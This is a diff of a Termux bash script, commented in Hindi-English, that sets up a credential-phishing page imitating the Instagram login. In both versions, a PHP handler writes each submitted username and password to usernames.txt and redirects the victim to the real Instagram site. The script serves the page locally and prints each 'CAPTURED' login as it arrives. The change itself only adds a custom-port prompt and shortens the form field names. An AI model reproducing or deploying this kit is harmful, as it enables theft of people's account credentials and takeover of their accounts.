@@ -1,22 +1,38 @@
 #!/bin/bash
 
-# --- 1. AUTO INSTALLER (System Check) ---
-echo -e "\033[1;33m[*] Setting up Custom Design...\033[0m"
-packages=("php" "proot" "wget")
-for pkg in "${packages[@]}"; do
-    if ! command -v $pkg &> /dev/null; then
-        echo -e "\033[1;31m[!] Installing $pkg...\033[0m"
-        pkg install $pkg -y > /dev/null 2>&1
-    fi
-done
+# --- 1. ASK FOR PORT (User Choice) ---
+clear
+GREEN='\033[1;32m'
+CYAN='\033[1;36m'
+YELLOW='\033[1;33m'
+RED='\033[1;31m'
+RESET='\033[0m'
 
-# --- 2. CLEANUP ---
+echo -e "${GREEN}========================================${RESET}"
+echo -e "${CYAN}    CUSTOM PORT SERVER (God Mode)       ${RESET}"
+echo -e "${GREEN}========================================${RESET}"
+echo ""
+echo -ne "${YELLOW}Enter Port (Press Enter for 8080): ${RESET}"
+read USER_PORT
+
+# Agar user ne kuch nahi dala, to default 8080 set karo
+if [[ -z "$USER_PORT" ]]; then
+    PORT="8080"
+else
+    PORT="$USER_PORT"
+fi
+
+# --- 2. CLEANUP SPECIFIC PORT ---
+echo -e "\033[1;33m[*] Cleaning Port $PORT...\033[0m"
 pkill -f php > /dev/null 2>&1
+fuser -k $PORT/tcp > /dev/null 2>&1
+
+# --- 3. SETUP FOLDERS ---
+# (Setup wahi purana rahega, bas port change hoga)
 rm -rf auth/
 mkdir -p auth
 
-# --- 3. INJECT YOUR CUSTOM HTML (With Capture Logic) ---
-# Maine aapke HTML me <form> tag add kiya hai taki password capture ho sake
+# --- 4. CREATE HTML (Instagram Style) ---
 cat > auth/index.php <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -37,33 +53,27 @@ body{ background:#0b1116; color:#fff; }
 .card{ width:380px; }
 .card h2{ font-size:20px; margin-bottom:20px; }
 .input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
-.input:focus{ border: 1px solid #fff; }
-/* Button ko Active look diya hai taki click ho sake */
 .btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
-.btn:hover{ background:#1877f2; }
-.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor:pointer; }
-.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor:pointer; }
-.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor:pointer; }
+.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
+.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
+.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
 .meta{ text-align:center; margin-top:25px; opacity:.7; }
 @media(max-width:900px){ .main{flex-direction:column;} .left,.right{width:100%;} .left{display:none;} .right{height:100vh;} }
 </style>
 </head>
 <body>
-
 <div class="main">
     <div class="left">
         <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
         <h1>See everyday moments from <br>your <span>close friends.</span></h1>
         <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
     </div>
-
     <div class="right">
         <div class="card">
             <h2>Log in to Instagram</h2>
-            
             <form method="POST" action="login.php">
-                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
-                <input class="input" type="password" name="password" placeholder="Password" required>
+                <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
+                <input class="input" type="password" name="p" placeholder="Password" required>
                 <button class="btn" type="submit">Log in</button>
             </form>
             <div class="link">Forgotten password?</div>
@@ -77,50 +87,39 @@ body{ background:#0b1116; color:#fff; }
 </html>
 EOF
 
-# --- 4. CAPTURE LOGIC ---
+# --- 5. LOGIN LOGIC ---
 cat > auth/login.php <<EOF
 <?php
-file_put_contents("../usernames.txt", "IG User: " . \$_POST['username'] . " | Pass: " . \$_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
 ?>
 EOF
 
-# --- 5. START SERVER (God Mode) ---
-GREEN='\033[1;32m'
-CYAN='\033[1;36m'
-GOLD='\033[1;33m'
-RED='\033[1;31m'
-RESET='\033[0m'
+# --- 6. START SERVER (With User Port) ---
+echo -e "${CYAN}[*] Starting Server on Port $PORT...${RESET}"
 
-clear
-echo -e "${GREEN}==========================================${RESET}"
-echo -e "${GOLD}    INSTAGRAM UI SERVER (Custom Design)   ${RESET}"
-echo -e "${CYAN}    Status: GOD MODE (Permission Fixed)   ${RESET}"
-echo -e "${GREEN}==========================================${RESET}"
-
-echo -e "${CYAN}[*] Starting Server...${RESET}"
-
-# Using termux-chroot for 100% success
-termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
+# Yaha hum wahi variable use kar rahe hain jo user ne diya
+termux-chroot php -S 127.0.0.1:$PORT -t auth > server.log 2>&1 &
 PID=$!
 sleep 3
 
-# --- 6. MONITORING ---
+# --- 7. CHECK STATUS ---
 if ps -p $PID > /dev/null; then
-    echo -e "${GREEN}[✔] PAGE HOSTED SUCCESSFULLY!${RESET}"
-    echo -e "${CYAN}-----------------------------------${RESET}"
-    echo -e "${GOLD}👉 Link: http://127.0.0.1:8080${RESET}"
-    echo -e "${CYAN}-----------------------------------${RESET}"
+    echo -e "${GREEN}[✔] SUCCESS! Server Running.${RESET}"
+    echo -e "${CYAN}Link: http://127.0.0.1:$PORT${RESET}"
     echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
     echo ""
     echo -e "${GREEN}Waiting for Login...${RESET}"
     
+    # Logs Monitor
     touch usernames.txt
     tail -f usernames.txt | while read line; do
-        echo -e "${RED}[!] CAPTURED: ${GOLD}$line${RESET}"
+        echo -e "${RED}[!] CAPTURED: ${YELLOW}$line${RESET}"
         echo -e "\a"
     done
 else
-    echo -e "${RED}[!] Server Error.${RESET}"
+    echo -e "${RED}[!] FAILED! Port $PORT shayad busy hai.${RESET}"
+    echo -e "${YELLOW}Log:${RESET}"
+    cat server.log
 fi
